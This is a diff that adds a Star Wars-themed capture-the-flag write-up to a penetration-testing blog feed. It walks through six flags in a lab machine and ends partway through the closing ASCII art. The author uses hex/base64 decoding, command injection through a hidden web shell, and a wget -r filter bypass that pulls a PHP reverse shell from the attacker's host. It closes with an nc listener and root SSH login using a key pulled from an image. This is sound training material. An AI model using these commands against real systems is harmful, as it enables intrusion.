@@ -4,7 +4,7 @@
   <title><![CDATA[Category: penetration testing | Core dump overflow]]></title>
   <link href="http://chousensha.github.io/blog/categories/penetration-testing/atom.xml" rel="self"/>
   <link href="http://chousensha.github.io/"/>
-  <updated>2018-10-20T16:17:54-04:00</updated>
+  <updated>2018-10-27T13:22:48-04:00</updated>
   <id>http://chousensha.github.io/</id>
   <author>
     <name><![CDATA[chousensha]]></name>
@@ -12,6 +12,681 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[All your 64Base are belong to us]]></title>
+    <link href="http://chousensha.github.io/blog/2018/10/26/all-your-64base-are-belong-to-us/"/>
+    <updated>2018-10-26T15:14:14-04:00</updated>
+    <id>http://chousensha.github.io/blog/2018/10/26/all-your-64base-are-belong-to-us</id>
+    <content type="html"><![CDATA[<p>This machine is based on Star Wars. The goal is &ldquo;to Beat the Empire and steal the plans for the Death Star before its too late.&rdquo;. For this to happen, 6 flags encoded in base64 need to be collected.</p>
+
+<p><a href="https://www.youtube.com/watch?v=v8MqvUeDqL4">I AM THE EMPIRE!</a></p>
+
+<!-- more -->
+
+
+<p><code>
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh?
+| fingerprint-strings:
+|   GenericLines, NULL:
+|     The programs included with the Fedora GNU/Linux system are free software;
+|     exact distribution terms for each program are described in the
+|     individual files in /usr/share/doc/*/copyright.
+|     Fedora GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+|     permitted by applicable law.
+|_    Last login: Mon Oct 24 02:04:10 4025 from 010.101.010.001
+80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
+| http-robots.txt: 429 disallowed entries (15 shown)
+| /administrator/ /admin/ /login/ /88888/ /88888888/
+| /88888888888/ /88888888888P/ /c3P08P/ /C3p0/ /A280/ /above/ /AC1/
+|_/across/ /activation/ /Adjustments/
+|_http-server-header: Apache/2.4.10 (Debian)
+|_http-title: 64base
+4899/tcp  open  radmin?
+| fingerprint-strings:
+|   NULL:
+|     sshhh! ssh! droids!
+|     So..
+|     found a way in then...
+|     but, can you pop root?
+|     /~\n |oo ) Did you hear that?
+|     _=/_
+|     ()\x20 //|/.\|\
+|     _|_____|_ \ _/ ||
+|     \|\x20/| ||
+|     ||__*__|| | | |
+|     ___/ ~| []|[]
+|     /=\x20/=\x20/=\x20 | | |
+|_    ________________[_]_[_]_[_]________/_]_[__________________________
+62964/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
+| ssh-hostkey:
+|   1024 59:a5:02:ba:72:8a:2e:c1:9c:ff:cc:b2:f8:15:66:b3 (DSA)
+|   2048 2a:57:2c:75:8c:34:9f:28:84:15:07:2a:be:d0:41:98 (RSA)
+|   256 97:94:13:38:92:70:6c:3a:c0:4f:f3:f3:e7:ce:40:91 (ECDSA)
+|_  256 e0:45:24:da:a1:2d:8a:21:c8:cf:98:4b:7f:42:e7:d4 (ED25519)
+</code></p>
+
+<p>The first red herring is SSH on port 22. If you try connecting to it, it looks like it gives you a root shell, and then it closes the connection. There is no SSH there:</p>
+
+<p>```
+nc -vn 192.168.145.138 22
+(UNKNOWN) [192.168.145.138] 22 (ssh) open
+The programs included with the Fedora GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.</p>
+
+<p>Fedora GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Mon Oct 24 02:04:10 4025 from 010.101.010.001</p>
+
+<p>#
+id
+```</p>
+
+<p>Then there is port 4899, which shows some ASCII art, but nothing seems to happen otherwise:</p>
+
+<p>```
+You found a way in then&hellip;</p>
+
+<p>but, can you pop root?</p>
+
+<pre><code>                                       /~\
+                                      |oo )    Did you hear that?
+                                      _\=/_
+                      ___            /  _  \
+                     / ()\          //|/.\|\\
+                   _|_____|_        \\ \_/  ||
+                  | | === | |        \|\ /| ||
+                  |_|  O  |_|        # _ _/ #
+                   ||  O  ||          | | |
+                   ||__*__||          | | |
+                  |~ \___/ ~|         []|[]
+                  /=\ /=\ /=\         | | |
+  ________________[_]_[_]_[_]________/_]_[_\_________________________
+</code></pre>
+
+<p>```</p>
+
+<h2>Flag #1 &ndash; Decode and decode some more</h2>
+
+<p>The web server takes us to Lord Vader&rsquo;s blog:</p>
+
+<p><img class="center" src="/images/pentest/64base/blog.png" title="&lsquo;blog&rsquo; &lsquo;vader blog&rsquo;" ></p>
+
+<p>You probably noticed that weird string, <em>dmlldyBzb3VyY2UgO0QK</em>. If you look in the HTML source, you will find a comment following it:</p>
+
+<p>```</p>
+
+<!--5a6d78685a7a4637546d705361566c59546d785062464a7654587056656c464953587055616b4a56576b644752574e7151586853534842575555684b6246524551586454656b5a77596d316a4d454e6e5054313943673d3d0a-->
+
+
+<p>```</p>
+
+<p>It&rsquo;s hex encoded, and decoding it gives a&hellip;I&rsquo;m sure you expect it by now&hellip;base64 string:</p>
+
+<p><code>
+ZmxhZzF7TmpSaVlYTmxPbFJvTXpVelFISXpUakJVWkdGRWNqQXhSSHBWUUhKbFREQXdTekZwYm1jMENnPT19Cg==
+</code></p>
+
+<p>Decoding this gives the 1st flag: <code>flag1{NjRiYXNlOlRoMzUzQHIzTjBUZGFEcjAxRHpVQHJlTDAwSzFpbmc0Cg==}</code>, and further decoding the flag leaves us with what look like credentials for something: <code>64base:Th353@r3N0TdaDr01DzU@reL00K1ing4</code></p>
+
+<h2>Flag #2 &ndash; Imperial class bounty hunter</h2>
+
+<p>If you browse the pages you can read some Star Wars centric posts. I didn&rsquo;t go through them thoroughly, but I did notice a relevant hint in a picture for something that might come up later:</p>
+
+<p><img class="center" src="/images/pentest/64base/hint.jpg" title="&lsquo;hint&rsquo; &lsquo;shell hint&rsquo;" ></p>
+
+<p>So..when we&rsquo;ll reach the point of getting a shell, we&rsquo;ll have to use <em>system</em> instead of <em>exec</em>. Cool..now it&rsquo;s time to look inside that massive robots.txt. There are too many entries to show and the few I&rsquo;ve tried were blank. Under <em>/admin</em> there&rsquo;s basic authentication, but the credentials from the first flag didn&rsquo;t work. Some attention to detail is required for this one. In the above picture, there is another important hint that I&rsquo;ve overlooked: <em>Only respond if you are a real Imperial-Class BountyHunter</em>. Within the plethora of robots.txt entries there is this:</p>
+
+<p><code>
+Disallow: /Imperial-class/
+</code></p>
+
+<p>Useless like the others, but the message said <em>Imperial-Class</em>..could it be that one capital letter would make the difference? I tried <a href="http://192.168.145.138/Imperial-Class/">http://192.168.145.138/Imperial-Class/</a> and another basic authentication box popped up, and this time the credentials worked!</p>
+
+<p><img class="center" src="/images/pentest/64base/error.jpg" title="&lsquo;error&rsquo; &lsquo;error&rsquo;" ></p>
+
+<p>It looks like a dead end, but the source is with us:</p>
+
+<p>```</p>
+
+<!-- don't forget the BountyHunter login -->
+
+
+<p>```</p>
+
+<p>Adding this part to the URL (<em>Imperial-Class/BountyHunter</em>) takes us to a login page:</p>
+
+<p><img class="center" src="/images/pentest/64base/login.jpg" title="&lsquo;login&rsquo; &lsquo;login&rsquo;" ></p>
+
+<p>The force..source to the rescue again! If you view the source, you will notice another 3 hex strings:</p>
+
+<p><code>
+5a6d78685a7a4a37595568534d474e4954545a4d65546b7a5a444e6a645756
+584f54466b53465a70576c4d31616d49794d485a6b4d6b597757544a6e4c32
+584f54466b53465a70576c4d31616d49794d485a6b4d6b597757544a6e4c32
+</code></p>
+
+<p>Decoding them as a block gives us another base64 string:</p>
+
+<p><code>
+ZmxhZzJ7YUhSMGNITTZMeTkzZDNjdWVXOTFkSFZpWlM1amIyMHZkMkYwWTJnL2RqMTJTbmQ1ZEVaWFFUaDFRUW89fQo=
+</code></p>
+
+<p>And decoding this gives the second flag: <code>flag2{aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj12Snd5dEZXQTh1QQo=}</code>. But it&rsquo;s the inside that matters, and it&rsquo;s actually a <a href="https://www.youtube.com/watch?v=vJwytFWA8uA">link to Youtube</a></p>
+
+<p><img class="center" src="/images/pentest/64base/burp.png" title="&lsquo;burp&rsquo; &lsquo;burp&rsquo;" ></p>
+
+<p>So we&rsquo;ll have to use Burp for the next part.</p>
+
+<h2>Flag #3 &ndash; Burp'ing for the empire</h2>
+
+<p>I&rsquo;ve put some dummy values in the login form and intercepted the requests with Burp..it&rsquo;s important to also capture the server response, because the flag is in the 302 Moved Temporarily response from the server: <code>flag3{NTNjcjN0NWgzNzcvSW1wZXJpYWwtQ2xhc3MvQm91bnR5SHVudGVyL2xvZ2luLnBocD9mPWV4ZWMmYz1pZAo=}</code>. And decoding it shows the way to the secret shell that was hinted at previously: <code>53cr3t5h377/Imperial-Class/BountyHunter/login.php?f=exec&amp;c=id</code></p>
+
+<h2>Flag #4 &ndash; System, not exec</h2>
+
+<p>Going to <a href="http://192.168.145.138/Imperial-Class/BountyHunter/login.php?f=exec&amp;c=id">http://192.168.145.138/Imperial-Class/BountyHunter/login.php?f=exec&amp;c=id</a> takes us to a page that only has the text &ldquo;[64base Command Shell]&rdquo; displayed on it. Trying different commands for the <em>c</em> parameter doesn&rsquo;t change anything, but we have the tip from before. So I switched to <strong>?f=system&amp;c=id</strong> and got the flag and the command output:</p>
+
+<p>```
+flag4{NjRiYXNlOjY0YmFzZTVoMzc3Cg==}</p>
+
+<p>Debian GNU/Linux 8 \n \l</p>
+
+<p>Sat Oct 27 16:05:00 BST 2018
+Linux 64base 3.16.0-4-586 #1 Debian 3.16.36-1+deb8u2 (2016-10-19) i686 GNU/Linux</p>
+
+<pre><code>      inet addr:192.168.145.138  Bcast:192.168.145.255  Mask:255.255.255.0
+      inet6 addr: fe80::20c:29ff:fe0a:a6d1/64 Scope:Link
+</code></pre>
+
+<p>uid=1001(64base) gid=1001(64base) groups=1001(64base)
+```</p>
+
+<p>Decoding the flag gives another set of possible credentials: <code>64base:64base5h377</code>. Tried them on the SSH with no success.</p>
+
+<h2>Flag #5 &ndash; When nothing else works, recurse!</h2>
+
+<p>Even though it looks like we have a shell, in reality, many commands don&rsquo;t work. At this point, I looked at a hint from other solutions to understand what is going on. It seems there is some filtering in place, and you can see what is being filtered by using PHP&rsquo;s <strong>var_dump</strong> function, which displays structured information (type and value) about variables. I tried downloading a reverse shell from my system with <code>?f=system&amp;c=wget <a href="http://192.168.145.133:8001/shell.php">http://192.168.145.133:8001/shell.php</a></code>, but of course it didn&rsquo;t work. However, when I tried looking at how the command is constructed with <code>?f=var_dump&amp;c=wget <a href="http://192.168.145.133:8001/shell.php">http://192.168.145.133:8001/shell.php</a></code>, I saw what was filtered out:</p>
+
+<p><code>
+string(190) "echo '
+flag4{NjRiYXNlOjY0YmFzZTVoMzc3Cg==}
+';cat.real /etc/issue;date;uname -a;/sbin/ifconfig eth0|/usr/share/grep.real inet;echo
+ sudo -u 64base wget http192.168.145.1338001shell.php"
+</code></p>
+
+<p>The slash and colon characters are filtered out. I played with it and saw that other special characters are also filtered out, so I couldn&rsquo;t use command chaining to get rid of it. I could not point wget to my server that with the shell. But wget has the option of recursive downloading, with the <em>-r</em> switch. If I could serve the shell in the root of my web server, it should be recursively downloaded, since there would be no blacklisted characters in the command. So I used Python&rsquo;s SimpleHTTPServer to serve the shell on port 80 and tested the recursive download from my machine, and it created a directory corresponding with the one downloaded, with the shell inside:</p>
+
+<p>```
+wget -r 192.168.145.133
+&mdash;2018-10-27 10:03:58&mdash;  <a href="http://192.168.145.133/">http://192.168.145.133/</a>
+Connecting to 192.168.145.133:80&hellip; connected.
+HTTP request sent, awaiting response&hellip; 200 OK
+Length: 216 [text/html]
+Saving to: ‘192.168.145.133/index.html’</p>
+
+<p>192.168.145.133/index.html            100%[======================================================================>]     216  &mdash;.-KB/s    in 0s</p>
+
+<p>2018-10-27 10:03:58 (11.8 MB/s) &ndash; ‘192.168.145.133/index.html’ saved [216/216]</p>
+
+<p>Loading robots.txt; please ignore errors.
+&mdash;2018-10-27 10:03:58&mdash;  <a href="http://192.168.145.133/robots.txt">http://192.168.145.133/robots.txt</a>
+Connecting to 192.168.145.133:80&hellip; connected.
+HTTP request sent, awaiting response&hellip; 404 File not found
+2018-10-27 10:03:58 ERROR 404: File not found.</p>
+
+<p>&mdash;2018-10-27 10:03:58&mdash;  <a href="http://192.168.145.133/shell.php">http://192.168.145.133/shell.php</a>
+Connecting to 192.168.145.133:80&hellip; connected.
+HTTP request sent, awaiting response&hellip; 200 OK
+Length: 5497 (5.4K) [application/octet-stream]
+Saving to: ‘192.168.145.133/shell.php’</p>
+
+<p>192.168.145.133/shell.php             100%[======================================================================>]   5.37K  &mdash;.-KB/s    in 0s</p>
+
+<p>2018-10-27 10:03:58 (638 MB/s) &ndash; ‘192.168.145.133/shell.php’ saved [5497/5497]</p>
+
+<p>FINISHED &mdash;2018-10-27 10:03:58&mdash;
+Total wall clock time: 0.01s
+Downloaded: 2 files, 5.6K in 0s (212 MB/s)
+```</p>
+
+<p>I made the change and dumped the variable as it looks now:</p>
+
+<p><code>
+sudo -u 64base wget -r 192.168.145.138
+</code></p>
+
+<p>Things are looking good. But when I ran it, still nothing happened, and there was no GET request downloading the shell on my Python server. After more time spent dumping variations of the command, the one that finally worked was <code>?f=system&amp;c=ls | wget -r 192.168.145.133</code></p>
+
+<p>Now my server received a request, and when I listed the current directory:</p>
+
+<p><code>
+total 48K
+drwxr-xr-x 6 www-data www-data 4.0K Oct 27 18:12 .
+drwxr-xr-x 3 www-data www-data 4.0K Dec  6  2016 ..
+drwxr-xr-x 2 www-data www-data 4.0K Oct 27 18:12 192.168.145.133
+-rwxr-x--- 1 www-data www-data 2.1K Dec  5  2016 cat
+drwxr-xr-x 2 www-data www-data 4.0K Dec  5  2016 css
+-rwxr-x--- 1 www-data www-data  757 Dec  6  2016 index.html
+-rwxr-x--- 1 www-data www-data  705 Dec  5  2016 index.jade
+-rwxr-x--- 1 www-data www-data  959 Dec  6  2016 index.php
+drwxr-xr-x 2 www-data www-data 4.0K Dec  5  2016 js
+-rwxr-x--- 1 www-data www-data 1.1K Dec  5  2016 license.txt
+-rwxr-x--- 1 www-data www-data  835 Dec  6  2016 login.php
+drwxr-xr-x 2 www-data www-data 4.0K Dec  5  2016 scss
+</code></p>
+
+<p>Navigating to <a href="http://192.168.145.138/Imperial-Class/BountyHunter/192.168.145.133/shell.php">http://192.168.145.138/Imperial-Class/BountyHunter/192.168.145.133/shell.php</a> served me the shell on my listener:</p>
+
+<p><code>
+nc -vnlp 8888
+listening on [any] 8888 ...
+connect to [192.168.145.133] from (UNKNOWN) [192.168.145.138] 45307
+Linux 64base 3.16.0-4-586 #1 Debian 3.16.36-1+deb8u2 (2016-10-19) i686 GNU/Linux
+ 18:44:14 up  4:27,  0 users,  load average: 0.00, 0.01, 0.05
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ python -c 'import pty; pty.spawn("/bin/bash")'      
+www-data@64base:/$
+</code></p>
+
+<p>I looked around and saw more ASCII art files, then I ran a quick search for the flag:</p>
+
+<p><code>
+www-data@64base:/$ find / -name flag* 2&gt;/dev/null
+/var/www/html/admin/S3cR37/flag5{TG9vayBJbnNpZGUhIDpECg==}
+</code></p>
+
+<p>And the hint for the last flag is <code>Look Inside! :D</code>.</p>
+
+<h2>Flag #6 &ndash; Use the force</h2>
+
+<p>Running file on the found file shows that it&rsquo;s a JPEG image:</p>
+
+<p><code>
+JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, comment: "4c5330744c5331435255644a546942535530456755464a4a566b4655525342", baseline, precision 8, 960x720, frames 3
+</code></p>
+
+<p>There is hex in the comment, I decoded it to <code>LS0tLS1CRUdJTiBSU0EgUFJJVkFURSB</code>. Then I passed this through a base64 decoder and it gave me the beginning of an SSH private key:</p>
+
+<p><code>
+-----BEGIN RSA PRIVATE
+</code></p>
+
+<p>I needed to take a better look at this, so I downloaded it to my machine:</p>
+
+<p><img class="center" src="/images/pentest/64base/flag.jpg" title="&lsquo;flag&rsquo; &lsquo;flag5&rsquo;" ></p>
+
+<p>And then I ran exiftool on it and the comment string was actually huge. So there must be a complete private key in there. So I went again through the hex and bas64 decoding process, to get the key:</p>
+
+<p>```
+&mdash;&mdash;-BEGIN RSA PRIVATE KEY&mdash;&mdash;&ndash;
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,621A38AAD4E9FAA3657CA3888D9B356C</p>
+
+<p>mDtRxIwh40RSNAs2+lNRHvS9yhM+eaxxU5yrGPCkrbQW/RgPP+RGJBz9VrTkvYw6
+YcOuYeZMjs4fIPn7FZyJgxGHhSxQoxVn9kDkwnsMNDirtcoCOk9RDAG5ex9x4TMz
+8IlDBQq5i9Yzj9vPfzeBDZdIz9Dw2gn2SaEgu5zel+6HGObF8Zh3MIchy8s1XrE0
+kvLKI252mzWw4kbSs9+QaWyh34k8JIVzuc1QCybz5WoU5Y56G6q1Rds0bcVqLUse
+MSzKk3mKaWAyLXlo7LnmqqUFKHndBE1ShPVVi4b0GyFILOOvtmvFb4+zhu6jOWYH
+k2hdCHNSt+iggy9hh3jaEgUnSPZuE7NJwDYa7eSDagL17XKpkm2YiBVrUXxVMnob
+wXRf5BcGKU97xdorV2Tq+h9KSlZe799trTrFGNe05vxDrij5Ut2KcQx+98K8KpWL
+guJPRPKGijo96HDGc3L5YsxObVg+/fj0AvsKfrcV/lxaW+Imymc1MXiJMbmCzlDw
+TAWmaqkRFDyA1HUvtvSeVqS1/HjhDw9d4KsvsjkjvyeQTssfsdGcU0hDkXwRWssd
+2d3G+Njm1R5ZLNgRlNpVGjhKC4AsfXS3J0z2t3BPM9ZOBMBe9Dx8zm5xFY9zWtrv
+AGpr0Bh8KQwmpjQUc1afsqaQX0UHNLXT1ZOWKjg4SA3XC9dCEyFq0SIxQjO9LGCG
+4Q5ncfUhmvtqyutCll2dXPsXVDe4eoD1CkvJNDY3KPW+GkN9L+9CPy8+DNunFIwx
++T++7Qg/uPXKq4M61IQ8034UhuRWS4TqP9azX3CG9LyoiB6VbKOeDwN8ailLKZBs
+fY9Q6AM1sylizH1nnxKOtZQWurxjGJBIs62telMkas9yNMk3Lu7qRH6swO9sdTBi
++j0x4uDZjJcgMXxfb0w5A64lYFsMRzFj7Xdfy19+Me8JEhQ8KNXDwQKDyULFOTsz
+13VfBNxYsyL5zGXNzyqZ4I/OO7Med2j0Gz0g21iHA/06mrs2clds6SUBGEvn8NiV
+rSrH6vEs4Szg0x8ddGvQ0qW1vMkTRu3Oy/e10F745xDMATKRlKZ6rYHMCxJ3Icnt
+Ez0OMXYdC6CiF/IWtgdU+hKyvs4sFtCBclSagmDTJ2kZdu4RRwYVV6oINz9bpOvE
+Rx3HUqfnKShruzM9ZkiIkuSfRtfiMvbTzffJTS4c48CO5X/ReF/AaMxkbSdEOFsI
+Fv9Xdi9SdNuxGHE2G4HvJdIprFUrVSpSI80wgrb245sw6gToitZ90hJ4nJ5ay7AG
+Yiaa5o7877/fw6YZ/2U3ADdiSOBm+hjV2JVxroyUXbG5dfl3m8Gvf71J62FHq8vj
+qJanSk8175z0bjrXWdLG3DSlIJislPW+yDaf7YBVYwWR+TA1kC6ieIA5tU3pn/I3
+64Z5mpC+wqfTxGgeCsgIk9vSn2p/eetdI3fQW8WXERbDet1ULHPqtIi7SZbj8v+P
+fnHLQvEwIs+Bf1CpK1AkZeUMREQkBhDi72HFbw2G/zqti/YdnqxAyl6LZzIeQn8t
+/Gj4karJ1iM9If39dM5OaCVZR/TOBVaR8mrP7VtJor9jeH2tEL0toEqWB1PK0uXP
+&mdash;&mdash;-END RSA PRIVATE KEY&mdash;&mdash;&ndash;
+```</p>
+
+<p>When trying to SSH with the key, I got prompted for a passphrase. I took a swing at it with the message from the image, <em>usetheforce</em>, and it was a win:</p>
+
+<p>```
+ssh <a href="&#x6d;&#97;&#105;&#108;&#x74;&#111;&#x3a;&#x72;&#x6f;&#111;&#116;&#x40;&#49;&#x39;&#x32;&#46;&#49;&#54;&#x38;&#46;&#x31;&#x34;&#53;&#46;&#49;&#x33;&#x38;">&#x72;&#111;&#x6f;&#x74;&#x40;&#x31;&#57;&#x32;&#46;&#49;&#x36;&#x38;&#46;&#x31;&#52;&#x35;&#x2e;&#x31;&#x33;&#56;</a> -p 62964 -i ssh.key
+Enter passphrase for key &lsquo;ssh.key&rsquo;:</p>
+
+<p>Last login: Tue Dec  6 05:40:07 2016 from 172.16.0.18</p>
+
+<p>flag6{NGU1NDZiMzI1YTQ0NTEzMjRlMzI0NTMxNTk1NDU1MzA0ZTU0NmI3YTRkNDQ1MTM1NGU0NDRkN2E0ZDU0NWE2OTRlNDQ2YjMwNGQ3YTRkMzU0ZDdhNDkzMTRmNTQ1NTM0NGU0NDZiMzM0ZTZhNTk3OTRlNDQ2MzdhNGY1NDVhNjg0ZTU0NmIzMTRlN2E2MzMzNGU3YTU5MzA1OTdhNWE2YjRlN2E2NzdhNGQ1NDU5Nzg0ZDdhNDkzMTRlNmE0ZDM0NGU2YTQ5MzA0ZTdhNTUzMjRlMzI0NTMyNGQ3YTYzMzU0ZDdhNTUzMzRmNTQ1NjY4NGU1NDYzMzA0ZTZhNjM3YTRlNDQ0ZDMyNGU3YTRlNmI0ZDMyNTE3NzU5NTE2ZjNkMGEK}
+root@64base:~#
+```</p>
+
+<p>Almost over, because that flag required several decoding cycles before it gave me something usable: <code>base64 -d /var/local/.luke|less.real</code>. With that, I ran it and got the mission success message, which will take a couple of minutes to read:</p>
+
+<p>```</p>
+
+<pre><code>     __          __  _ _   _____                      
+     \ \        / / | | | |  __ \                     
+      \ \  /\  / /__| | | | |  | | ___  _ __   ___    
+       \ \/  \/ / _ \ | | | |  | |/ _ \| '_ \ / _ \   
+        \  /\  /  __/ | | | |__| | (_) | | | |  __/   
+     __  \/ _\/ \___|_|_|_|_____/ \___/|_|_|_|\___| _ 
+     \ \   / /          |  __ \(_)   | | |_   _| | | |
+      \ \_/ /__  _   _  | |  | |_  __| |   | | | |_| |
+       \   / _ \| | | | | |  | | |/ _` |   | | | __| |
+        | | (_) | |_| | | |__| | | (_| |  _| |_| |_|_|
+        |_|\___/ \__,_| |_____/|_|\__,_| |_____|\__(_)
+</code></pre>
+
+<hr />
+
+<p>%=x%= | |V| |<em>)|</em> |<em>) | |</em>| |   |<em>) |</em>| (<em>  |</em>  |<em>) |  |</em>| |\| (<em>  %=x%=x%=x
+~~~~~ | | | |  |</em> | \ | | | |<em>  |</em>) | | <strong>) |<em>  |   |</em> | | | | </strong>) ~~~~~~~~~
+LS</p>
+
+<pre><code>             .-. .-.
+           .=========.         E x t e r i o r ,   A e r i a l   V i e w
+           ||.-.7.-.||         -----------------------------------------
+           ||`-' `-'||
+           `========='
+            `-'| |`-'8               1 .............. Sensor Suite Tower
+      ______   |9|   ______          2 ... Heavy Twin Turbolaser Turrets
+     /     /\__| |__/\     \         3 ............. Heavy Laser Turrets
+    /  \_ / /  |_|  \ \ _/  \        4 ....... TIE Fighter Launch Chutes
+   /___(\\\/         \///)___\       5 ............... Heavy Blast Doors
+   \____\\`==========='//____/       6 .................... Guard towers
+   /     '/ .-------. \\     \       7 ........ Shuttle Landing Platform
+__/     //. \`+---+'/ .\\     \__    8 ........... AT-AT Docking Station
+</code></pre>
+
+<p>   /\ \    ///x<code>.\|___|/.'x\\\    / /\   9 ................. Connecting Ramp
+  /  \ \  //</code>&ndash;.<em>//|   |\</em>.2'\  / /  \
+ /  <em>.&ndash;===&lsquo;</em><strong><strong>//.&ndash;=&ndash;.\</strong></strong><em><code>===-._  \
+ \  </code>&ndash;===.-.  \ `&ndash;=1&rsquo; /  .&ndash;/.===&ndash;&lsquo; 3 / The pre-fabricated,  multi-function
+  \  / /  \\ \  .===./  /4///  \ \  /  Imperial garrison base is the back-
+   \/</em>/    \\ | /.&mdash;&ndash;.\ | ///    _\/   bone of the  Empire&rsquo;s  occupational</p>
+
+<pre><code>  \     \\\|/ |_m_| \|///     /      forces. These heavily-armoured for-
+   \_____\=============/_____/       tresses have  walls up to 10 meters
+   /____///    ___    \\\____\       thick  to  guard   against   ground
+   \   (_//\__|||||__/\\_)   /       assaults,  and  powerful  deflector
+    \  /  \|,,|||||,,|/  \  /        shields  protect  them  for  air or
+     \_____|  | 5 | 6|_____/         space attacks.
+           `--'   `--'
+</code></pre>
+
+<hr />
+
+<p>%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</p>
+
+<pre><code>                       U           E x t e r i o r ,   S i d e   V i e w
+                      /_\          -------------------------------------
+                   1 [___]
+                     :`:':           1 .............. Sensor Suite Tower
+                     `:::'           2 ... Heavy Twin Turbolaser Turrets
+              _       :_:       _    3 ............. Heavy Laser Turrets
+            =[ ]2     [%]      [ ]=  4 ....... Tie Fighter Launch Chutes
+             :=:      :=:      :=:   5 ............... Heavy Blast Doors
+            _|_|_   __| |__   _|_|_  6 .................... Guard Towers
+           / /XX|\ /__|_|__\ /|XX\ \
+     3    /4/XXX| | _/___\_ | |XXX\ \             7 ....... AT-AT Walker
+--===____/--===X|_|/_______\|_|X===--\____===--   8 ........ AT-ST Scout
+ /__| |     /l_\\             //_|\     |_|__\
+/~~.' |    /:'  \\   _____   //  `:\    | `.  \
+</code></pre>
+
+<p>   /   | .&lsquo;   / |    \==|||||==//    | \   <code>. |   \   7    8
+  /   .' |   / .'     |  ||5|| 6|    </code>. \   | `.   \  xx=   _
+ /<em><em><strong>|</strong>|<strong>/</strong>|</em></em><em><em><strong>l</strong>|||||<strong>l</strong></em></em><strong>|</strong>_<em>|<strong>|</strong></em>_\ ll   &lt;~</p>
+
+<hr />
+
+<p>%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</p>
+
+<pre><code>                                             O u t e r   D e f e n s e s
+        |                      |             ---------------------------
+     ^_[]_^                 ^_[]_^
+     |----|               5 |----|        1 ... High Voltage Death Fence
+</code></pre>
+
+<p> <strong><strong><strong>__<code>-..-'________4________</code>&ndash;..&ndash;&lsquo;</strong></strong></strong>  2 &hellip;&hellip;. Perimeter Gate House
+ ===========================================  3 &hellip;&hellip;.. Powered Force Field</p>
+
+<pre><code>      `||'                   `||'         4 .......... Fortified Catwalk
+       ||     ^==^   ^==^     ||          5 ......... Observattion tower
+</code></pre>
+
+<p> <em><strong>.</strong>__.</em>ll<em>.</em>1<em>|&mdash;|   |&mdash;|</em><strong>.<em>ll</em>.</strong><strong>.</strong>__
+ XXX|XXXX|XIIX|XXX|&mdash;| 3 |&mdash;|XXX|XIIX|XXXX|XXXX
+ XXX|XXXX|XIIX|XXX| 2|   |  |XXX|XIIX|XXXX|XXXX</p>
+
+<p> The outer perimeter is  marked  by a  high-voltage  &ldquo;death fence.&rdquo;  Powered
+ Force fields  placed at regular intervals along the fence may be turned off
+ to permit entry and exit.  Observation towers,  connected by fortified cat-
+ walks,  are set back from the fence and constantly manned by stormtroopers.
+ Other outer  defenses  include energy mine fields,  modified patrol Droids,
+ and AT-ST Scout Walkers.</p>
+
+<hr />
+
+<p>%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</p>
+
+<pre><code>         _
+        /|                               L a n d i n g   P l a t f o r m
+      -==+                               -------------------------------
+        :
+     [__________]               Up to two Lambda-class shuttles and four
+     `' ||  ||`-'               AT-AT  Walkers can dock at the platform.
+       ========  =xx            A loading  ramp  leads directly from the
+        ||  ||    ll            platform into the garrison complex.
+ ~~~~~~~~~~~~~~~~~~~~~~
+</code></pre>
+
+<hr />
+
+<p>%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%=x%
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</p>
+
+<pre><code>                                 I n t e r i o r ,   L e v e l s   1 - 5
+                                 ---------------------------------------
+
+      ______         ______      The first 5 levels of the garrison com-
+     / ____ \_______/ ____ \     plex are of identical layout, construc-
+    / /    \_________/    \ \    ted  around  a  level-spanning  surface
+   / /      |   3   |  5   \ \   vehicle bay.  Refer to the key below to
+   \ \       \_____/_______/ /   determine what each level contains.
+   / /    o   |o o|   o    \ \
+__/ /  2    .' o4o `.    6  \ \__    1 ... Storage Gallery (levels 1-2),
+</code></pre>
+
+<p>   / <strong>/      .&lsquo; .<em>o_o</em>. <code>.      \__ \         Armory (levels 3-4), Training
+  / / </code>&ndash;.  .&rsquo; .&lsquo;  10   <code>.</code>.  .&ndash;&rsquo;  \ \        Facilities   and   Recreation
+ / /      ~&lsquo; .&rsquo;<code>-._____.-'</code>. `~      \ \       Rooms (level 5)
+ \ \     o  &lt;  C  | | |  D  >  o  7  / / 2 &hellip; Stormtrooper Barracks (levels
+  \ __      \    &lsquo; &rsquo; &lsquo;    /      </strong>/ /        1-3),    Security    Barracks
